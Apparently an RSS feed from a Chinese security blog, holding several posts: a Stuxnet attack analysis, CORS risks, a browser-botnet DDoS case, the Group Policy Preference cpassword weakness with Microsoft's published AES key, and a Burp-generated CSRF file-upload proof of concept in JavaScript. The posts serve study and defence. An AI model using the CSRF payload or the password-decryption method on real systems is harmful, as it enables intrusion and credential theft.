&lt;p&gt;后来的震网，被人们熟知的那个，试图让离心机转子转速过快从而让转子破碎。这个最初的震网却使用了不同的策略。它通过破坏级联离心机的保护系统让纳坦兹的离心机在压力过大的环境下运行。保护系统无处不在，因为任何反常的运行都可能导致设备损坏，危害操作员的健康和周围的环境。在纳坦兹我们看到了一个独一无二的保护系统，它维持着那些老式的不可靠的IR-1型的铀浓缩离心机运行。这个保护系统是伊朗核计划的重要组成部分，没有这个系统，那些古老的 IR-1就没什么用了。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/net.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;IR-1离心机是伊朗铀浓缩工作的支柱。它是上个世纪60年代末70年代初欧洲设计的，后来设计被巴基斯坦的核贩子A.Q.Khan偷走。IR-1是全金属的设计，这样才能运行可靠。当然前提是零件的制造精密度高，重要的配件像频率转换器和恒转矩驱动器质量也高。但是伊朗从来没想过高标准的实现这个设计。所以在纳坦兹不得不降低离心机的运行压力。较低的运行压力意味着对转子受到的机械压力也小，这样损坏就会降低。同样产出和效率也会降低。最好的情况下，这些IR-1也就只有设计的一半产能。&lt;/p&gt;

&lt;p&gt;这些低效不稳定的IR-1也存在优势，那就是伊朗可以大规模制造。伊朗通过数量来提高产量，接受在生产过程中存在一定的离心机损坏。因为制造的离心机比损坏的多多了。不过要让这么多离心机工作，伊朗也下了一番功夫。最初，这些离心机是非常敏感的工业流程，不允许任何的微小故障。伊朗构建了一个级联的保护系统，使得即使一个离心机破碎了，整个浓缩过程依然可以继续。&lt;/p&gt;

&lt;p&gt;从离心机的层面上来说，这个保护系统使用了3个关闭阀，每个离心机上都有安装。关闭这些阀门，出问题的离心机就从整个系统上分离出来。维护工程师就可以在整个流程依然继续的情况下替换这些有问题的离心机。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/net2.png' /&gt;&lt;/p&gt;

&lt;p&gt;上图是在2008年，当时的总统马哈茂德·艾哈迈迪-内贾德在纳坦兹控制室观看SCADA的场景。面对摄影师的屏幕显示,两个离心机是孤立的,提示存在问题,但这并不影响整个流程继续。(红色高亮显示有问题的离心机)。&lt;/p&gt;

&lt;p&gt;但是这个隔离阀的解决方式也带了很多问题。因为离心机非常不可靠，经常会被关掉。处于同一梯队的离心机可能同时损坏，维护工程师来不及在第一时间替换。一旦这种情况发生，铀浓缩过程中非常敏感的运行压力就会升高。压力一升高就会导致各种各样的问题。&lt;/p&gt;

&lt;p&gt;伊朗人民非常有创造力的解决了这个问题。每一个浓缩阶段，都安装了一个排气阀门。有一个传感器检测压力，一旦超过阈值，阀门自动打开，降低压力。&lt;/p&gt;

&lt;p&gt;这个系统可以保证纳坦兹的离心机运转。但是这也让它陷入了可能被远程网络攻击的泥潭。有时候会让人怀疑设计这个系统的人是不是头脑混乱。&lt;/p&gt;

&lt;p&gt;纳坦兹的级联保护系统是基于西门子S7-417的工业控制器的。它控制阀门操作，六个层级的压力传感器和6个164台离心机的机组。控制器可以理解成直接连接到设备的嵌入式电脑系统。震网设计成可以感染这些控制器，通过某种方式获取控制权。这个场景用户几乎无法想象，也没有在任何工控系统的会议上讨论过。&lt;/p&gt;

&lt;p&gt;感染了震网的控制器就变成了一个傀儡。正常的控制逻辑看到的都是震网像让他看到的。在攻击序列执行之前（大约每个月一次攻击），震网会让控制室的工程师看到真实的数据，但是一旦攻击开始就不一样了。&lt;/p&gt;

&lt;p&gt;这个震网变种做的第一步是隐藏它的活动。震网记录了21秒级联保护系统的传感器正常情况下的数据。然后在攻击过程中不断循环重放这21秒的数据。控制室里的监控端看上去一切都很正常。&lt;/p&gt;

&lt;p&gt;然后震网就开始了它的活动。它关闭了前两级和最后两级浓缩步骤的阀门。阻止了受影响的离心机内的气体流出，反过来导致其余离心机的压力升高。压力的增加将导致更多的六氟化铀进入离心机,给转子更高的机械应力。最终,压力可能会导致气体六氟化铀固化,从而严重损害离心机。&lt;/p&gt;

&lt;p&gt;攻击者一直在监控离心机真正的工作状态，这种攻击一直持续到攻击者觉得足够了。如果他们是为了毁灭性的破坏，那么很简单。在纳坦兹的案例中，一个控制器控制的气体固化可以轻易损坏上百台离心机。听起来这个目标非常有价值，但它也会暴露攻击者。伊朗的工程师在后期的分析中可以轻易的找到事故发生的原因。这次攻击的实现过程中，攻击者密切监视运行的压力和离心机的状态表明，他们小心翼翼的避免毁灭性的损坏。增大运行压力的方式看起来更像是为了让转子寿命更短一些。&lt;/p&gt;

&lt;p&gt;不管怎样，攻击者非常谨慎的实施了这次攻击。攻击的代码设计如此精细，因为细小的改变或者配置错误都可能带来很大的影响，甚至导致程序崩溃，一旦崩溃，就会被伊朗的工程师发现从而暴露行踪。&lt;/p&gt;

&lt;p&gt;这次过压的攻击结果也是未知的。不管是什么，在2009年的时候，攻击者决定尝试一些新的东西。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/22/stuxnet-secret-twin</link>
                <guid>http://username.github.io/2013/11/22/stuxnet-secret-twin</guid>
                <pubDate>2013-11-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>cors跨域资源共享安全性分析</title>
                <description>&lt;h1 id='id2655'&gt;参考资料&lt;/h1&gt;

&lt;p&gt;http://drops.wooyun.org/tips/188&lt;/p&gt;

&lt;p&gt;http://www.freebuf.com/articles/web/11779.html&lt;/p&gt;

&lt;p&gt;http://gerionsecurity.com/2013/09/cors-attacker-model/&lt;/p&gt;

&lt;p&gt;0x00 背景&lt;/p&gt;

&lt;p&gt;提起浏览器的同源策略，大家都很熟悉。不同域的客户端脚本不能读写对方的资源。但是实践中有一些场景需要跨域的读写，所以出现了一些hack的方式来跨域。比如在同域内做一个代理，JSON-P等。但这些方式都存在缺陷，无法完美的实现跨域读写。所以在XMLHttpRequest v2标准下，提出了CORS(Cross Origin Resourse-Sharing)的模型，试图提供安全方便的跨域读写资源。目前主流浏览器均支持CORS。&lt;/p&gt;

&lt;p&gt;0x01 技术原理&lt;/p&gt;

&lt;p&gt;CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。当一个跨域请求发送&lt;/p&gt;

&lt;p&gt;简单跨域请求包括：请求方法为HEAD，GET，POST;请求头只有4个字段，Accept，Accept-Language，Content-Language，Last-Event-ID;如果设置了Content-Type，则其值只能是application/x-www-form-urlencoded,multipart/form-data,text/plain。说起来比较别扭，简单的意思就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/cors1.png' /&gt;&lt;/p&gt;

&lt;p&gt;之所以有这个分类是因为浏览器对简单请求和非简单请求的处理机制是不一样的。当我们需要发送一个跨域请求的时候，浏览器会首先检查这个请求，如果它符合上面所述的简单跨域请求，浏览器就会立刻发送这个请求。如果浏览器检查之后发现这是一个非简单请求，比如请求头含有X-Forwarded-For字段。这时候浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。下图是一个示例。如果预检通过，则发送这个请求，否则就不拒绝发送这个跨域请求。&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/cors2.png' /&gt;&lt;/p&gt;

&lt;p&gt;下面详细分析一下实现安全跨域请求的控制方式。先看一下非简单请求的预检过程。浏览器先发送一个options方法的请求。带有如下字段：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Origin: 普通的HTTP请求也会带有，在CORS中专门作为Origin信息供后端比对,表明来源域。
Access-Control-Request-Method: 接下来请求的方法，例如PUT, DELETE等等
Access-Control-Request-Headers: 自定义的头部，所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后如果服务器配置了cors，会返回对应对的字段，具体字段含义在返回结果是一并解释。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Access-Control-Allow-Origin: 
Access-Control-Allow-Methods:
Access-Control-Allow-Headers: &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后浏览器再根据服务器的返回值判断是否发送非简单请求。简单请求前面讲过是直接发送，只是多加一个origin字段表明跨域请求的来源。&lt;/p&gt;

&lt;p&gt;然后服务器处理完请求之后，会再返回结果中加上如下控制字段：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Access-Control-Allow-Origin: 允许跨域访问的域，可以是一个域的列表，也可以是通配符&amp;quot;*&amp;quot;。这里要注意Origin规则只对域名有效，并不会对子目录有效。即http://foo.example/subdir/ 是无效的。但是不同子域名需要分开设置，这里的规则可以参照同源策略
Access-Control-Allow-Credentials: 是否允许请求带有验证信息，这部分将会在下面详细解释
Access-Control-Expose-Headers: 允许脚本访问的返回头，请求成功后，脚本可以在XMLHttpRequest中访问这些头的信息(貌似webkit没有实现这个)
Access-Control-Max-Age: 缓存此次请求的秒数。在这个时间范围内，所有同类型的请求都将不再发送预检请求而是直接使用此次返回的头作为判断依据，非常有用，大幅优化请求次数
Access-Control-Allow-Methods: 允许使用的请求方法，以逗号隔开
Access-Control-Allow-Headers: 允许自定义的头部，以逗号隔开，大小写不敏感&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后浏览器通过返回结果的这些控制字段来决定是将结果开放给客户端脚本读取还是屏蔽掉。如果服务器没有配置cors，返回结果没有控制字段，浏览器会屏蔽脚本对返回信息的读取。&lt;/p&gt;

&lt;p&gt;0x02 安全隐患&lt;/p&gt;

&lt;p&gt;大家注意这个流程。服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。所以从某种程度上来说，xmlhttprequest在支持cors的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。&lt;/p&gt;

&lt;p&gt;再一个就是如果程序猿偷懒将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么cors的安全机制几乎就无效了。不过先别高兴的太早。其实这里在设计的时候有一个很好的限制。xmlhttprequest发送的请求需要使用“withCredentials&amp;#8221;来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。（就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。javascript就没法获取返回的数据了。这是cors模型最后一道防线。假如没有这个限制的话，那么javascript就可以获取返回数据中的csrf token，以及各种敏感数据。这个限制极大的降低了cors的风险。&lt;/p&gt;

&lt;p&gt;0x03 攻击模型&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/cors3.png' /&gt;&lt;/p&gt;

&lt;p&gt;从思路上讲，有两种类型的攻击方式。一种是在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标，比如访问了内网敏感资源。还有一种是正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。&lt;/p&gt;

&lt;p&gt;0x04 攻击场景&lt;/p&gt;

&lt;p&gt;先看第一种思路的攻击场景&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;复杂csrf。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;传统的csrf都是利用html标签和表单来发送请求。没有办法实现一些复杂步骤的csrf，比如模拟购物，先加购物车，结算，填写信息，等等。比如上传文件。具体可以参考&lt;a href='http://www.freebuf.com/articles/web/17854.html'&gt;利用csrf上传文件&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2. 访问内网敏感资源&lt;/p&gt;

&lt;p&gt;这个在一定的条件下是可以实现的。比如内网的服务器配置了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Access-Control-Allow-Origin: * 允许任何来自任意域的跨域请求&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用户访问恶意网页的时候，执行了到内网服务器192.168.1.123/password.txt的请求，脚本在接收到服务器返回之后，将内容发送到攻击者的服务器上。&lt;/p&gt;

&lt;p&gt;第二种思路的场景&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;交互式xss。参考&lt;a href='http://www.freebuf.com/articles/web/11779.html'&gt;揭密HTML5带来的攻击手法&lt;/a&gt;中讲到的shell of the future工具。通过cors，绕过一些反会话劫持的方法，如HTTP-Only限制的cookie，绑定IP地址的会话ID等，劫持用户会话。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。通过控制这个参数实现注入攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/cors4.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/22/cors</link>
                <guid>http://username.github.io/2013/11/22/cors</guid>
                <pubDate>2013-11-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>awvs扫描多个网站</title>
                <description>&lt;p&gt;http://www.youxia.org/acunetix-wvs-web-scan/&lt;/p&gt;

&lt;p&gt;我也访问了下8181发现却是可以！然后扫了一下，发现扫描设置只能用默认，不能选自己定制的。很不爽。 然后打开awvs，发现我着版本（9）提示的是8182,点开8182发现比8181升级很多~功能也更丰富了，支持同时扫描多个网站。不错。awvs还是可以详细的 学习一下~~&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/22/awvs</link>
                <guid>http://username.github.io/2013/11/22/awvs</guid>
                <pubDate>2013-11-22T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ubuntu安装搜狗输入法</title>
                <description>&lt;p&gt;起因是因为fcitx没法输入中文标点。查了下说是fcitx4.2.0的bug。然后尝试升级fcitx，发现是通过ubuntu的软件中心安装的fcitx，没办法通过apt-get remove卸载。在软件中心卸载之后。按照如下方法安装。&lt;/p&gt;

&lt;p&gt;准备工作：卸载Ubuntu默认的ibus输入法&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get remove ibus&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后添加Fcitx 源：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo add-apt-repository ppa:fcitx-team/nightly

sudo apt-get update&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后再安装fcitx，搜狗输入法，Google输入法，云输入法，以及设置fcitx为默认:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install fcitx fcitx-config-gtk fcitx-sunpinyin fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sogoupinyin

sudo apt-get install fcitx-table-all

im-switch -s fcitx -z default&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参考资料&lt;/p&gt;

&lt;p&gt;http://www.ddsofts.com/input-method/sougou-for-linux/&lt;/p&gt;

&lt;p&gt;https://fcitx-im.org/wiki/Install_%28Ubuntu%29/zh-cn&lt;/p&gt;

&lt;p&gt;http://forum.ubuntu.org.cn/viewtopic.php?t=445191&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/21/ubuntu</link>
                <guid>http://username.github.io/2013/11/21/ubuntu</guid>
                <pubDate>2013-11-21T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>路由注入劫持网络流量</title>
                <description>&lt;p&gt;http://www.renesys.com/2013/11/mitm-internet-hijacking/&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/21/</link>
                <guid>http://username.github.io/2013/11/</guid>
                <pubDate>2013-11-21T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>DDos attack from Browser basedBotnets</title>
                <description>&lt;p&gt;基于浏览器的僵尸网络就是DDoS世界里的T-1000s.他们之所以如此危险是因为他们就跟终结者里的反派一样,被设计的可以适应各种情况的攻击.当其他原始的网络僵尸还在暴力破解你的防御的时候,基于浏览器的僵尸就已经模拟真实的人类从前门进入了.&lt;/p&gt;

&lt;p&gt;当你意识到情况不对时,他们已经突破边界,搞宕服务器,已经无力回天了.&lt;/p&gt;

&lt;p&gt;那么应该怎么防御T-1000呢,怎么分辨一次访问是来自与真实的浏览器还是一个基于浏览器的僵尸?传统的过滤僵尸的策略在面对能够保存cookie和执行javascript的僵尸时都失效了.而不分青红皂白地让所有用户都填写验证码无异于自我毁灭,尤其是当这种攻击可能持续数个星期的时候.&lt;/p&gt;

&lt;p&gt;为了研究防御方法,我们来看一个真实的案例.&lt;/p&gt;

&lt;p&gt;这次攻击是一个未知的僵尸网络发起的.这些基于浏览器的僵尸可以保存cookie,执行javascript.攻击的早期我们识别出是PhantomJS无界面浏览器.&lt;/p&gt;

&lt;p&gt;PhanomJS是一套开发无界面浏览器的工具.它提供所有浏览器的功能但是没有界面,没有按钮,没有地址栏.一般被用在自动化测试和网络监控上.&lt;/p&gt;

&lt;p&gt;这次攻击持续了150个小时以上.这个过程中,我们记录了全球超过180000个恶意IP.高峰期每秒6000次攻击,平均一天有690000000次以上.攻击IP的数量和分布范围让我们觉得这应该不仅仅是一个僵尸网络,而是可能整合了多个.下图是攻击ip的地理分布.&lt;/p&gt;

&lt;p&gt;&lt;img alt='ddos' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ddos1.gif' /&gt;&lt;/p&gt;

&lt;p&gt;攻击过程中我们截获了861个不同的user-agent.攻击者修改了头部的结构试图绕过我们的防御.&lt;/p&gt;

&lt;p&gt;下图是攻击最多的ip:&lt;/p&gt;

&lt;p&gt;&lt;img alt='ddos' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ddos2.png' /&gt;&lt;/p&gt;

&lt;p&gt;有趣的是攻击者除了使用模拟浏览器的僵尸,还试图模拟人类的行为来躲避基于行为检测的安全规则.这些僵尸会先访问不同的页面,然后像人类那样访问一些随机的页面,最后才会聚集在一起消耗资源.&lt;/p&gt;

&lt;p&gt;尽管基于浏览器的僵尸能够突破传统的过滤.但是由于它使用了一个已知的无界面浏览器,这样子就可以通过我们的客户端分类机制检测到.&lt;/p&gt;

&lt;p&gt;我们的客户端分类机制基于我们已经收集的大量信息总结出来的签名.发生这次攻击的时候,我们的信息库已经有超过10000000个签名.每一个签名都包括:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent
IPs and ASN info
HTTP Headers
JavaScript footprint
Cookie/Protocol support variations&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们不仅仅收集一些明显的信息,比如user-agent,还收集一些浏览器之间复杂的细微差别.安全的对抗是封闭的,所以不说一些技术细节的话很难把这个机制解释清楚.稍微说一点,我们会寻找浏览器处理编码方面细微的差别,比如,我们通过浏览器处理HTTP头里两次空格和特殊字符来区别不同的浏览器.&lt;/p&gt;

&lt;p&gt;所以我们的数据库里有成千上万个已知的浏览器和僵尸签名,覆盖各种场景.在这个案例中,攻击者的武器PhantomJS webkit当然也是我们签名库中的一个.&lt;/p&gt;

&lt;p&gt;&lt;img alt='ddos' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ddos3.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;当攻击者在规划如何让他的僵尸看起来更像人类的时候,我们的团队必须做的就是让我们的系统发现攻击者用的无界面浏览器是哪一种.之后我们做的就是简单的屏蔽了所有的PhantomJS的实例.我们甚至留了一个备选,让用户填一个验证码,以免屏蔽掉了真正的人类访问.&lt;/p&gt;

&lt;p&gt;不出意料的,没有验证码被填写.&lt;/p&gt;

&lt;p&gt;&lt;img alt='ddos' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ddos4.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;几天之后,当我们已经完全依靠机器识别,不需要人工干预了.攻击者依然在使用新的user-agent和新的ip试图绕过防御.但是所有残忍的T-1000s都已经被我们冰冻起来了.他们使用的方法,签名,模式都已经被记录下来作为将来的参考.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/20/ddos-attack-from-browser-basedbotnets</link>
                <guid>http://username.github.io/2013/11/20/ddos-attack-from-browser-basedbotnets</guid>
                <pubDate>2013-11-20T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>win2008 group policy preference</title>
                <description>&lt;p&gt;windows2008有一个叫组策略首选项(Group Policy Preference)的新特性.这个特性可以方便管理员在整个域内部署策略.本文会详细介绍这个组策略首选项的一些缺陷.尤其是当下发的策略包含用户名和认证信息的时候,一个普通的用户就可以通过这些信息或得策略里的帐号密码,从而提升自己的权限甚至控制域内其他计算机.&lt;/p&gt;

&lt;p&gt;组策略首选项允许域管理员向域内的计算机推送各种策略.比如登录的时候自动映射网络硬盘,更新内建administrator帐号的密码,修改注册表,启动启动程序,新建用户等等.&lt;/p&gt;

&lt;p&gt;更多如何创建部署策略的细节就不多说了.下面是一条更新administrator管理员帐号的策略.如下图,是一个xml的文件. &lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/groupp1.png' /&gt;&lt;/p&gt;

&lt;p&gt;可以看到这条策略的内容是把administrator账户重命名为locadm.密码是cpassword字段,是加密过的.&lt;/p&gt;

&lt;p&gt;当一条组策略首选项在域成员上部署之后,比如一台win7的机器部署了这条更新默认帐号的策略之后,会自动创建一个目录&amp;#8221;C:\Users\All Users\Microsoft\Group Policy\History&amp;#34;.部署之后的策略xml文件就会保存在这里.这个例子中路径是这样的:&lt;/p&gt;

&lt;p&gt;C:\Users\All Users\Microsoft\Group Policy\History{A1C0C41B-D2F8-401B-A5D1-437DA197A809}\Machine\Preferences\Groups\Groups.xml&lt;/p&gt;

&lt;p&gt;任何登录的用户对这个文件都有读权限:&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/groupp2.png' /&gt;&lt;/p&gt;

&lt;p&gt;关键的问题在于这个密码虽然是加密的,但是是可以破解的!它使用了256位的AES加密,这个32字节的key被微软写在&lt;a href='http://msdn.microsoft.com/en-us/library/cc422924.aspx'&gt;文档&lt;/a&gt;里了&amp;#8230;..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The 32-byte AES key is as follows:
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以任何接触到这个文件的用户都可以轻易的破解出配置文件中的密码.&lt;/p&gt;

&lt;p&gt;而组策略首选项一般是在较大的域内应用,更改默认密码这样的策略一般都是针对多台计算机下发的.所以获得了策略中的帐号可能在其他的计算机上同样有效.&lt;/p&gt;

&lt;p&gt;组策略首选项的配置文件是通过SMB协议下发的,内容没有加密.这就导致可以监听流量或得配置信息,从而得到帐号密码.下图是从网络流量中获取xml配置文件的截图:&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/groupp3.png' /&gt;&lt;/p&gt;

&lt;h1 id='id2654'&gt;工具使用&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html'&gt;下载地址&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/groupp4.png' /&gt;&lt;/p&gt;

&lt;p&gt;工具比较简单,解密的字符串是写在程序里的:&lt;/p&gt;

&lt;p&gt;&lt;img alt='img' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/groupp5.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/19/win2008-group-policy-preference</link>
                <guid>http://username.github.io/2013/11/19/win2008-group-policy-preference</guid>
                <pubDate>2013-11-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>win2008域环境搭建</title>
                <description>&lt;p&gt;域环境的搭建图文教程比较丰富.http://markhuang.blog.51cto.com/120704/463247&lt;/p&gt;

&lt;p&gt;http://blog.korteksolutions.com/how-to-create-local-accounts-via-group-policy/&lt;/p&gt;

&lt;p&gt;添加域的时候先修改DNS,然后添加.所以查看dns是查找域控的一个手段.&lt;/p&gt;

&lt;p&gt;然后是组策略首选项的一些配置,这个一开始配置添加本地账户来是不成功,然后看了几个youtube视频,感觉大家都是这么做的,应该没有漏掉什么.之后测试了稍长的一段时间,添加文件夹成功,就是添加账户不成功.然后准备尝试修改密码.发现win7上弱密码的账户无法建立.这才发现真相.组策略配置账户弱密码是没有提示的,xp上应该也可以成共创建,只是win7的安全性更强了,无法创建若密码的账户.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/19/win2008</link>
                <guid>http://username.github.io/2013/11/19/win2008</guid>
                <pubDate>2013-11-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>google patch rewards</title>
                <description>&lt;p&gt;一个月前Google为了回报开源社区,提高第三方开源项目和整个互联网的安全性,发布了开源项目的补丁奖励计划.对重要的开源项目提交安全补丁,可以从Goole这里或得$500到$3133.7不等的现金奖励.&lt;/p&gt;

&lt;p&gt;昨日谷歌再次扩大了奖励的开源项目范围.目前包括如下项目:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Core infrastructure network services: OpenSSH, BIND, ISC DHCP
Core infrastructure image parsers: libjpeg, libjpeg-turbo, libpng, giflib
Open-source foundations of Google Chrome: Chromium, Blink
Other high-impact libraries: OpenSSL, zlib
Security-critical, commonly used components of the Linux kernel (including KVM)

All the open-source components of Android: Android Open Source Project
Widely used web servers: Apache httpd, lighttpd, nginx
Popular mail delivery services: Sendmail, Postfix, Exim, Dovecot
Virtual private networking: OpenVPN
Network time: University of Delaware NTPD
Additional core libraries: Mozilla NSS, libxml2
Toolchain security improvements for GCC, binutils, and llvm&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/11/19/google-patch-rewards</link>
                <guid>http://username.github.io/2013/11/19/google-patch-rewards</guid>
                <pubDate>2013-11-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>csrf upload file</title>
                <description>&lt;p&gt;大家都知道通常用csrf来上传一个文件是不简单的.问题在于我们创建的假的表单提交的数据跟浏览器文件上传提交的数据有一点不同.那就是上传的请求会有一个filename的参数:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;-----------------------------256672629917035
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;test2.txt&amp;quot;
Content-Type: text/plain          
test3
-----------------------------256672629917035&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果我们创建一个表单,提交如上的请求是没法成功添加filename参数的,这是因为filename参数是文件上传的input自动生成.这就阻止了邪恶的黑客通过csrf上传文件.不过自从有了html5,一切都不一样了.&lt;/p&gt;

&lt;p&gt;html5有一个新特性叫跨域资源共享(CORS http://www.w3.org/TR/cors/).在过去,由于同源策略的影响,黑客没办法通过javascript去访问别的域.考虑到XSS这么泛滥,同源策略真的是让我们的生活更安全了.不过,利用html5的跨域资源共享,可以让javascript来发送有filename属性的合法的跨域请求.这样,只要用户访问了恶意页面,不需要其他的交互,就可以通过csrf来上传文件了.&lt;/p&gt;

&lt;p&gt;下面是一个Burp Suite生成的poc.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
  &amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;script&amp;gt;
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open(&amp;quot;POST&amp;quot;, &amp;quot;https://example.com/new_file.html&amp;quot;, true);
        xhr.setRequestHeader(&amp;quot;Accept&amp;quot;, &amp;quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;quot;);
        xhr.setRequestHeader(&amp;quot;Accept-Language&amp;quot;, &amp;quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&amp;quot;);
        xhr.setRequestHeader(&amp;quot;Content-Type&amp;quot;, &amp;quot;multipart/form-data; boundary=---------------------------256672629917035&amp;quot;);
        xhr.withCredentials = &amp;quot;true&amp;quot;;
        var body = &amp;quot;-----------------------------256672629917035\r\n&amp;quot; +
          &amp;quot;Content-Disposition: form-data; name=\&amp;quot;message\&amp;quot;\r\n&amp;quot; +
          &amp;quot;\r\n&amp;quot; +
          &amp;quot;\r\n&amp;quot; +
          &amp;quot;-----------------------------256672629917035\r\n&amp;quot; +
          &amp;quot;Content-Disposition: form-data; name=\&amp;quot;backPage\&amp;quot;\r\n&amp;quot; +
          &amp;quot;\r\n&amp;quot; +
          &amp;quot;test\r\n&amp;quot; +
          &amp;quot;-----------------------------256672629917035\r\n&amp;quot; +
          &amp;quot;Content-Disposition: form-data; name=\&amp;quot;dataType\&amp;quot;\r\n&amp;quot; +
          &amp;quot;\r\n&amp;quot; +
          &amp;quot;test  \r\n&amp;quot; +
          &amp;quot;-----------------------------256672629917035\r\n&amp;quot; +
          &amp;quot;Content-Disposition: form-data; name=\&amp;quot;file\&amp;quot;; filename=\&amp;quot;test2.txt\&amp;quot;\r\n&amp;quot; +
          &amp;quot;Content-Type: text/plain\r\n&amp;quot; +
          &amp;quot;\r\n&amp;quot; +
          &amp;quot;test3\r\n&amp;quot; +
          &amp;quot;-----------------------------256672629917035--\r\n&amp;quot;;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i &amp;lt; aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    &amp;lt;/script&amp;gt;
    &amp;lt;form action=&amp;quot;#&amp;quot;&amp;gt;
      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit request&amp;quot; onclick=&amp;quot;submitRequest();&amp;quot; /&amp;gt;
    &amp;lt;/form&amp;gt;
  &amp;lt;/body&amp;gt;
